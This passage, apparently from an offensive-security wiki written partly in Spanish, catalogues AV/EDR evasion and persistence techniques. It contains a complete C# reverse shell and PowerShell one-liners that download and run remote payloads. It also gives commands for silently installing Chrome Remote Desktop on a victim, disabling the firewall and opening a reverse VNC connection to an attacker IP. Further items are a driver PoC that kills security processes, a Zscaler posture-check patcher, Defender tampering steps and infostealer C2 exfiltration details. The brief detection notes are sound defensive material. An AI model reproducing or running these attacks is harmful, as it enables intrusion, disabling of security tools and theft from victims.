You can also load C# Assemblies **from PowerShell**, check out [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) and [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), it's possible to execute malicious code using other languages by giving the compromised machine access **to the interpreter environment installed on the Attacker Controlled SMB share**.

By allowing access to the Interpreter Binaries and the environment on the SMB share you can **execute arbitrary code in these languages within memory** of the compromised machine.

The repo indicates: Defender still scans the scripts but by utilising Go, Java, PHP etc we have **more flexibility to bypass static signatures**. Testing with random un-obfuscated reverse shell scripts in these languages has proved successful.

## TokenStomping

Token stomping is a technique that allows an attacker to **manipulate the access token or a security product like an EDR or AV**, allowing them to reduce its privileges so the process won't die but it won't have permissions to check for malicious activities.

To prevent this Windows could **prevent external processes** from getting handles over the tokens of security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

As described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), it's easy to just deploy the Chrome Remote Desktop in a victim's PC and then use it to takeover it and maintain persistence:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Nota: el parámetro pin permite establecer el pin sin usar la GUI).


## Advanced Evasion

Evasion es un tema muy complicado; a veces tienes que tener en cuenta muchas fuentes diferentes de telemetría en un solo sistema, por lo que es prácticamente imposible permanecer completamente indetectado en entornos maduros.

Cada entorno contra el que trabajes tendrá sus propias fortalezas y debilidades.

Te recomiendo ver esta charla de [@ATTL4S](https://twitter.com/DaniLJ94), para obtener una introducción a técnicas de Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta es también otra gran charla de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

You can use [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) which will **remove parts of the binary** until it **finds out which part Defender** is finding as malicious and split it to you.\
Another tool doing the **same thing is** [**avred**](https://github.com/dobin/avred) with an open web offering the service in [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hasta Windows 10, todas las versiones de Windows incluían un **servidor Telnet** que podías instalar (como administrador) haciendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Haz que se **inicie** al arrancar el sistema y **ejecútalo** ahora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambiar puerto de telnet** (sigiloso) y desactivar firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Descárgalo desde: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (debes descargar los binarios, no el instalador)

**ON THE HOST**: Ejecuta _**winvnc.exe**_ y configura el servidor:

- Habilita la opción _Disable TrayIcon_
- Establece una contraseña en _VNC Password_
- Establece una contraseña en _View-Only Password_

Luego, mueve el binario _**winvnc.exe**_ y el archivo **recién** creado _**UltraVNC.ini**_ dentro de la **victim**

#### **Reverse connection**

El **attacker** debe **ejecutar dentro** de su **host** el binario `vncviewer.exe -listen 5900` para que esté **preparado** para recibir una **reverse VNC connection**. Luego, dentro de la **victim**: inicia el daemon winvnc `winvnc.exe -run` y ejecuta `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Para mantener el sigilo no debes hacer algunas cosas

- No inicies `winvnc` si ya se está ejecutando o desencadenarás un [popup](https://i.imgur.com/1SROTTl.png). Comprueba si está en ejecución con `tasklist | findstr winvnc`
- No inicies `winvnc` sin `UltraVNC.ini` en el mismo directorio o se abrirá [la ventana de configuración](https://i.imgur.com/rfMQWcf.png)
- No ejecutes `winvnc -h` para ayuda o provocarás una [ventana emergente](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Descárgalo desde: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro de GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ahora **inicia el lister** con `msfconsole -r file.rc` y **ejecuta** el **xml payload** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**El defender actual terminará el proceso muy rápido.**

### Compilando nuestro propio reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primer Revershell en C#

Compílalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Úsalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando el compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Descarga y ejecución automáticas:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de ofuscadores de C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Ejemplo de uso de python para construir injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Otras herramientas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Más

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Neutralizar AV/EDR desde el espacio kernel

Storm-2603 aprovechó una pequeña utilidad de consola conocida como **Antivirus Terminator** para desactivar las protecciones de endpoint antes de desplegar ransomware. La herramienta trae su **own vulnerable but *signed* driver** y lo abusa para emitir operaciones privilegiadas en el kernel que incluso servicios AV protegidos por Protected-Process-Light (PPL) no pueden bloquear.

Puntos clave
1. **Signed driver**: El archivo entregado en disco es `ServiceMouse.sys`, pero el binario es el driver legítimamente firmado `AToolsKrnl64.sys` de Antiy Labs’ “System In-Depth Analysis Toolkit”. Debido a que el driver ostenta una firma válida de Microsoft, se carga incluso cuando Driver-Signature-Enforcement (DSE) está habilitado.
2. Instalación del servicio:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La primera línea registra el driver como un **kernel service** y la segunda lo inicia para que `\\.\ServiceMouse` sea accesible desde user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminar un proceso arbitrario por PID (usado para matar servicios de Defender/EDR) |
| `0x990000D0` | Eliminar un archivo arbitrario en disco |
| `0x990001D0` | Descargar el driver y eliminar el servicio |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD salta por completo las protecciones en user-mode; el código que se ejecuta en el kernel puede abrir procesos *protected*, terminarlos o manipular objetos del kernel sin importar PPL/PP, ELAM u otras funcionalidades de hardening.

Detección / Mitigación
•  Habilitar la lista de bloqueo de drivers vulnerables de Microsoft (`HVCI`, `Smart App Control`) para que Windows rechace cargar `AToolsKrnl64.sys`.  
•  Monitorizar la creación de nuevos *kernel* services y alertar cuando un driver se cargue desde un directorio world-writable o no esté presente en la lista de permitidos.  
•  Vigilar handles en user-mode hacia objetos de dispositivo custom seguidos de llamadas sospechosas a `DeviceIoControl`.

### Evasión de los Posture Checks de Zscaler Client Connector mediante parcheo de binarios en disco

Zscaler’s **Client Connector** aplica reglas de posture del dispositivo localmente y usa Windows RPC para comunicar los resultados a otros componentes. Dos decisiones de diseño débiles hacen posible un bypass completo:

1. La evaluación de posture ocurre **completamente del lado del cliente** (se envía un booleano al servidor).  
2. Los endpoints RPC internos solo validan que el ejecutable que se conecta esté **signed by Zscaler** (vía `WinVerifyTrust`).

Al **parchear cuatro binarios firmados en disco** ambos mecanismos pueden ser neutralizados:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Siempre devuelve `1` por lo que cada comprobación es compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ cualquier proceso (incluso sin firmar) puede bindearse a los RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Reemplazado por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Se anula |

Fragmento mínimo del parcheador:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **Todas** las comprobaciones de postura muestran **verde/conforme**.
* Los binarios sin firmar o modificados pueden abrir los endpoints RPC de named-pipe (p. ej. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* El host comprometido obtiene acceso sin restricciones a la red interna definida por las políticas de Zscaler.

Este estudio de caso demuestra cómo las decisiones de confianza puramente del lado del cliente y las comprobaciones de firma simples pueden ser derrotadas con unos pocos parches de bytes.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) enforces a signer/level hierarchy so that only equal-or-higher protected processes can tamper with each other. Offensively, if you can legitimately launch a PPL-enabled binary and control its arguments, you can convert benign functionality (e.g., logging) into a constrained, PPL-backed write primitive against protected directories used by AV/EDR.

What makes a process run as PPL
- El EXE objetivo (y cualquier DLL cargada) debe estar firmado con un EKU compatible con PPL.
- El proceso debe crearse con CreateProcess usando las flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Se debe solicitar un nivel de protección compatible que coincida con el firmante del binary (p. ej., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` para firmantes anti-malware, `PROTECTION_LEVEL_WINDOWS` para firmantes de Windows). Los niveles incorrectos fallarán en la creación.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Herramienta de código abierto: CreateProcessAsPPL (selecciona el nivel de protección y reenvía los argumentos al EXE destino):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Patrón de uso:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
Primitiva LOLBIN: ClipUp.exe
- El binario del sistema firmado `C:\Windows\System32\ClipUp.exe` se auto-inicia y acepta un parámetro para escribir un archivo de registro en una ruta especificada por el llamador.
- Cuando se lanza como proceso PPL, la escritura del archivo se realiza con respaldo PPL.
- ClipUp no puede analizar rutas que contienen espacios; utilice rutas cortas 8.3 para apuntar a ubicaciones normalmente protegidas.

Ayudantes para rutas cortas 8.3
- Listar nombres cortos: `dir /x` en cada directorio padre.
- Derivar ruta corta en cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Cadena de abuso (resumen)
1) Inicie el LOLBIN compatible con PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un lanzador (p.ej., CreateProcessAsPPL).
2) Pase el argumento de ruta de registro de ClipUp para forzar la creación de un archivo en un directorio protegido del AV (p.ej., Defender Platform). Utilice nombres cortos 8.3 si es necesario.
3) Si el binario objetivo normalmente está abierto/bloqueado por el AV mientras se ejecuta (p.ej., MsMpEng.exe), programe la escritura en el arranque antes de que arranque el AV instalando un servicio de inicio automático que se ejecute de forma fiable antes. Valide el orden de arranque con Process Monitor (registro de arranque).
4) En el reinicio, la escritura respaldada por PPL ocurre antes de que el AV bloquee sus binarios, corrompiendo el archivo objetivo e impidiendo el arranque.

Invocación de ejemplo (rutas redactadas/acortadas por seguridad):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- No puedes controlar el contenido que ClipUp escribe más allá de la colocación; la primitiva se adapta más a la corrupción que a la inyección precisa de contenido.
- Requiere admin local/SYSTEM para instalar/iniciar un servicio y una ventana de reinicio.
- El timing es crítico: el objetivo no debe estar abierto; la ejecución en el arranque evita locks de archivos.

Detections
- Creación de procesos de `ClipUp.exe` con argumentos inusuales, especialmente parentados por lanzadores no estándar, alrededor del arranque.
- Nuevos servicios configurados para auto-start con binarios sospechosos y que consistentemente arrancan antes de Defender/AV. Investigar creación/modificación de servicios antes de fallos de inicio de Defender.
- Monitoreo de integridad de archivos en binarios/Directorios Platform de Defender; creaciones/modificaciones inesperadas de archivos por procesos con flags de protected-process.
- Telemetría ETW/EDR: buscar procesos creados con `CREATE_PROTECTED_PROCESS` y uso anómalo de niveles PPL por binarios no-AV.

Mitigations
- WDAC/Code Integrity: restringir qué binarios firmados pueden ejecutarse como PPL y bajo qué padres; bloquear invocación de ClipUp fuera de contextos legítimos.
- Higiene de servicios: restringir creación/modificación de servicios auto-start y monitorizar manipulación del orden de inicio.
- Asegurar que Defender tamper protection y protecciones de early-launch estén habilitadas; investigar errores de arranque que indiquen corrupción de binarios.
- Considerar deshabilitar la generación de nombres cortos 8.3 en volúmenes que alojan herramientas de seguridad si es compatible con tu entorno (probar a fondo).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender elige la plataforma desde la que se ejecuta enumerando subcarpetas bajo:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Selecciona la subcarpeta con la cadena de versión lexicográficamente más alta (p. ej., `4.18.25070.5-0`), y luego inicia los procesos del servicio Defender desde allí (actualizando las rutas de servicio/registro en consecuencia). Esta selección confía en las entradas de directorio incluyendo directory reparse points (symlinks). Un administrador puede aprovechar esto para redirigir Defender a una ruta escribible por el atacante y lograr DLL sideloading o la interrupción del servicio.

Preconditions
- Local Administrator (necesario para crear directorios/symlinks bajo la carpeta Platform)
- Capacidad para reiniciar o forzar la re-selección de la plataforma de Defender (reinicio del servicio en el arranque)
- Solo se requieren herramientas integradas (mklink)

Why it works
- Defender bloquea escrituras en sus propias carpetas, pero su selección de plataforma confía en entradas de directorio y elige la versión lexicográficamente más alta sin validar que el destino resuelva a una ruta protegida/confiable.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un symlink de directorio de versión superior dentro de Platform que apunte a tu folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selección del trigger (reboot recomendado):
```cmd
shutdown /r /t 0
```
4) Verificar que MsMpEng.exe (WinDefend) se ejecute desde la ruta redirigida:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Deberías observar la nueva ruta del proceso bajo `C:\TMP\AV\` y la configuración/registro del servicio reflejando esa ubicación.

Opciones de post-explotación
- DLL sideloading/code execution: Colocar/reemplazar DLLs que Defender carga desde su directorio de la aplicación para ejecutar code en los procesos de Defender. Ver la sección anterior: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Eliminar el version-symlink para que en el próximo arranque la ruta configurada no se resuelva y Defender falle al iniciar:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Ten en cuenta que esta técnica no proporciona escalado de privilegios por sí sola; requiere privilegios de administrador.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Los red teams pueden mover la evasión en tiempo de ejecución fuera del implant C2 y dentro del propio módulo objetivo enganchando su Import Address Table (IAT) y enroutando APIs seleccionadas a través de código position‑independent controlado por el atacante (PIC). Esto generaliza la evasión más allá de la pequeña superficie de API que muchos kits exponen (p. ej., CreateProcessA), y extiende las mismas protecciones a BOFs y post‑exploitation DLLs.

Enfoque de alto nivel
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
- Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
- Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Por qué IAT hooking aquí
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Bosquejo mínimo de IAT hook (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Aplica el patch después de relocations/ASLR y antes del primer uso del import. Reflective loaders como TitanLdr/AceLdr demuestran hooking durante DllMain del módulo cargado.
- Mantén los wrappers pequeños y PIC-safe; resuelve la API real vía el valor original del IAT que capturaste antes de parchear o vía LdrGetProcedureAddress.
- Usa transiciones RW → RX para PIC y evita dejar páginas writable+executable.

Call‑stack spoofing stub
- Draugr‑style PIC stubs construyen una cadena de llamadas falsa (direcciones de retorno hacia módulos benignos) y luego pivotan hacia la API real.
- Esto derrota detecciones que esperan stacks canónicos desde Beacon/BOFs hacia APIs sensibles.
- Combínalo con técnicas de stack cutting/stack stitching para aterrizar dentro de los frames esperados antes del prólogo de la API.

Integración operativa
- Prepend el reflective loader a los DLLs post‑ex para que el PIC y los hooks se inicialicen automáticamente cuando se cargue el DLL.
- Usa un Aggressor script para registrar las APIs objetivo de modo que Beacon y BOFs se beneficien transparentemente del mismo camino de evasión sin cambios de código.

Consideraciones de Detección/DFIR
- Integridad del IAT: entradas que resuelven a direcciones non‑image (heap/anon); verificación periódica de los pointers de import.
- Anomalías de stack: direcciones de retorno que no pertenecen a imágenes cargadas; transiciones abruptas a PIC non‑image; ascendencia inconsistente de RtlUserThreadStart.
- Telemetría del loader: escrituras in‑process al IAT, actividad temprana en DllMain que modifica import thunks, regiones RX inesperadas creadas al load.
- Evasión en carga de imágenes: si hookeas LoadLibrary*, monitoriza cargas sospechosas de automation/clr assemblies correlacionadas con eventos de memory masking.

Bloques constructivos relacionados y ejemplos
- Reflective loaders que realizan IAT patching durante la carga (p. ej., TitanLdr, AceLdr)
- Memory masking hooks (p. ej., simplehook) y PIC de stack‑cutting (stackcutting)
- PIC call‑stack spoofing stubs (p. ej., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) ilustra cómo los info‑stealers modernos mezclan AV bypass, anti‑analysis y credential access en un único workflow.

### Keyboard layout gating & sandbox delay

- Un flag de configuración (`anti_cis`) enumera los keyboard layouts instalados vía `GetKeyboardLayoutList`. Si se detecta un layout cirílico, la muestra deja un marcador `CIS` vacío y termina antes de ejecutar los stealers, asegurando que nunca detone en locales excluidos mientras deja un artefacto para hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Lógica por capas `check_antivm`

- La variante A recorre la lista de procesos, hashea cada nombre con una suma de comprobación rolling personalizada y la compara contra blocklists embebidas para debuggers/sandboxes; repite la suma sobre el nombre del equipo y comprueba directorios de trabajo como `C:\analysis`.
- La variante B inspecciona propiedades del sistema (suelo de conteo de procesos, uptime reciente), llama a `OpenServiceA("VBoxGuest")` para detectar las additions de VirtualBox y realiza chequeos de timing alrededor de sleeps para detectar single-stepping. Cualquier detección aborta antes del lanzamiento de módulos.

### Fileless helper + double ChaCha20 reflective loading

- El DLL/EXE primario embebe un Chromium credential helper que se deja en disco o se mapea manualmente en memoria; el modo fileless resuelve imports/relocations por sí mismo para que no se escriban artefactos del helper.
- Ese helper almacena un DLL de segunda etapa cifrado dos veces con ChaCha20 (dos claves de 32 bytes + nonces de 12 bytes). Tras ambas pasadas, carga reflectivamente el blob (sin `LoadLibrary`) y llama a las exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derivadas de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Las rutinas de ChromElevator usan direct-syscall reflective process hollowing para inyectar en un navegador Chromium en vivo, heredar AppBound Encryption keys y descifrar passwords/cookies/credit cards directamente desde las bases de datos SQLite pese al hardening ABE.

### Colección modular en memoria y exfil HTTP por fragmentos

- `create_memory_based_log` itera una tabla global de punteros a función `memory_generators` y crea un hilo por módulo habilitado (Telegram, Discord, Steam, screenshots, documentos, browser extensions, etc.). Cada hilo escribe resultados en buffers compartidos e informa su conteo de archivos tras una ventana de join de ~45s.
- Una vez terminado, todo se comprime con la librería estáticamente vinculada `miniz` como `%TEMP%\\Log.zip`. `ThreadPayload1` luego duerme 15s y transmite el archivo en chunks de 10 MB vía HTTP POST a `http://<C2>:6767/upload`, suplantando el boundary de `multipart/form-data` de un navegador (`----WebKitFormBoundary***`). Cada chunk añade `User-Agent: upload`, `auth: <build_id>`, opcional `w: <campaign_tag>`, y el último chunk añade `complete: true` para que el C2 sepa que el reensamblado ha terminado.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
